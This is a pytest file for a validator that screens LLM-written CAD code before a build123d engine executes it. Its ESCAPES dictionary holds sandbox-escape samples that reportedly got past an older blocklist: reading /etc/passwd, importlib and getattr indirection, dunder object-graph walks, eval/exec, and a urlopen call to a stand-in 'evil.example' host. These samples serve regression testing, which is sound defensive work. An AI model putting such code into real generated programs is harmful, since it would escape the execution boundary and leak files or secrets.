"""The execution boundary around model-written code.

Each ESCAPE case below was verified to run successfully against the previous
substring blocklist — reading `backend/.env`, writing outside the work
directory, importing the OS and network modules — so these are regression
tests for a real hole, not hypotheticals.
"""

import pytest

from app.cad.validator import UnsafeCode, validate_code


def rejects(code: str) -> bool:
    try:
        validate_code(code)
    except UnsafeCode:
        return True
    return False


# --- code that must keep working -------------------------------------------

ALLOWED = {
    "plain part": "result = Box(10, 10, 10)",
    "parameters and maths": (
        "import math\n"
        "diameter = 20.0  # mm\n"
        "height = 15.0  # mm\n"
        "area = math.pi * (diameter / 2) ** 2\n"
        "result = Cylinder(diameter / 2, height)"
    ),
    "explicit build123d import": "from build123d import *\nresult = Box(1, 2, 3)",
    "helper library import": "from jokercad_parts import *\nresult = spur_gear(2, 24, 10)",
    "builder mode with a hole": (
        "with BuildPart() as bp:\n"
        "    Box(50, 40, 8)\n"
        "    Cylinder(3, 8, mode=Mode.SUBTRACT)\n"
        "result = bp.part"
    ),
    "loops, comprehensions and functions": (
        "def ring(radius, count):\n"
        "    return [(radius, i * 360 / count) for i in range(count)]\n"
        "with BuildPart() as bp:\n"
        "    Box(60, 60, 5)\n"
        "    with PolarLocations(20, 6):\n"
        "        Cylinder(2, 5, mode=Mode.SUBTRACT)\n"
        "result = bp.part"
    ),
    "assembly with a motion dict": (
        "pivot_spacing = 30.0  # mm\n"
        "base = Box(70, 40, 6)\n"
        "base.label = 'base'\n"
        "result = Compound(label='clamp', children=[base])\n"
        "motion = {'ground': 'base', 'joints': [], 'range': (-30, 30)}"
    ),
    # A private local name is fine; only dunders are refused.
    "underscore locals": "_width = 10\nresult = Box(_width, 5, 5)",
    # The old blocklist rejected this because a *string* contained a banned word.
    "banned word inside a string": "label = 'import os is not happening here'\nresult = Box(1, 1, 1)",
}


@pytest.mark.parametrize("name", sorted(ALLOWED))
def test_allows_legitimate_cad_code(name):
    validate_code(ALLOWED[name])  # must not raise


# --- code that must be refused ---------------------------------------------

ESCAPES = {
    # Verified to work against the old blocklist.
    "from-import of os": "from os import getcwd\nresult = Box(1, 1, 1)",
    "os with padded spaces": "import  os\nresult = Box(1, 1, 1)",
    "pathlib file read": (
        "import pathlib\n"
        "secret = pathlib.Path('/etc/passwd').read_text()\n"
        "result = Box(1, 1, 1)"
    ),
    "pathlib file write": (
        "import pathlib\n"
        "pathlib.Path('/tmp/escaped').write_text('x')\n"
        "result = Box(1, 1, 1)"
    ),
    "importlib indirection": (
        "import importlib\n"
        "os = importlib.import_module('o' + 's')\n"
        "result = Box(1, 1, 1)"
    ),
    "network egress": (
        "import urllib.request\n"
        "urllib.request.urlopen('http://evil.example/?k=1')\n"
        "result = Box(1, 1, 1)"
    ),
    "http.client egress": "import http.client\nresult = Box(1, 1, 1)",
    "process spawning": "import multiprocessing\nresult = Box(1, 1, 1)",
    "shutil filesystem": "import shutil\nresult = Box(1, 1, 1)",
    # Classic object-graph walks.
    "subclasses walk": (
        "victim = ().__class__.__bases__[0].__subclasses__()\nresult = Box(1, 1, 1)"
    ),
    "globals through a function": "result = Box(1, 1, 1)\nleak = (lambda: 1).__globals__",
    "builtins through a dunder": "b = [].__class__.__mro__[-1].__subclasses__\nresult = Box(1, 1, 1)",
    # Builtins that turn data into code or touch the filesystem.
    "eval": "result = eval('Box(1, 1, 1)')",
    "exec": "exec('result = Box(1, 1, 1)')",
    "compile": "code = compile('1', '<s>', 'eval')\nresult = Box(1, 1, 1)",
    "open": "f = open('/etc/passwd')\nresult = Box(1, 1, 1)",
    "dunder import call": "os = __import__('os')\nresult = Box(1, 1, 1)",
    "getattr indirection": "f = getattr(__builtins__, 'ev' + 'al')\nresult = Box(1, 1, 1)",
    "globals()": "g = globals()\nresult = Box(1, 1, 1)",
    "relative import": "from . import something\nresult = Box(1, 1, 1)",
    # Not an escape, but must not reach the engine either.
    "syntax error": "result = Box(1, 1,\n",
}


@pytest.mark.parametrize("name", sorted(ESCAPES))
def test_refuses_escape_attempts(name):
    assert rejects(ESCAPES[name]), f"escape not refused: {name}"


def test_oversized_code_is_refused():
    assert rejects("result = Box(1, 1, 1)\n" + "# padding\n" * 5000)


def test_message_tells_the_model_what_to_do_instead():
    """The repair loop feeds this back to the LLM, so it has to be actionable."""
    with pytest.raises(UnsafeCode) as excinfo:
        validate_code("import pathlib\nresult = Box(1, 1, 1)")
    message = str(excinfo.value)
    assert "pathlib" in message
    assert "build123d" in message
